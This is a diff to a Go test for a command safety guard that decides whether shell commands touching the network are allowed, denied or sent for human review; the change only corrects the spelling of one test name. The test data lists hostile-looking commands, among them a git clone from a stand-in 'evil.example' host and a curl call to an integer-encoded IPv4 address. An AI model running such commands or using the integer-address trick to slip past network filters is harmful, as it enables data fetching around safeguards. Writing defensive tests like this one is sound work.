@@ -354,7 +354,7 @@ func TestGuardExtractsCommandAwareNetworkDestinations(t *testing.T) {
 		{"git clone options denied remote", "git clone --depth 1 https://evil.example/x checkout.dir", safety.DecisionDeny, "network.destination"},
 		{"nc host then port", "nc api.github.com 443", safety.DecisionAllow, "safety.no_findings"},
 		{"curl integer IPv4", "curl 2130706433", safety.DecisionDeny, "network.destination"},
-		{"curl unparseable destination", "curl ://broken", safety.DecisionNeedsHumanReview, "network.destination_unparsed"},
+		{"curl unparsable destination", "curl ://broken", safety.DecisionNeedsHumanReview, "network.destination_unparsed"},
 		{"curl version only", "curl --version", safety.DecisionAllow, "safety.no_findings"},
 		{"git status", "git status", safety.DecisionAllow, "safety.no_findings"},
 	}
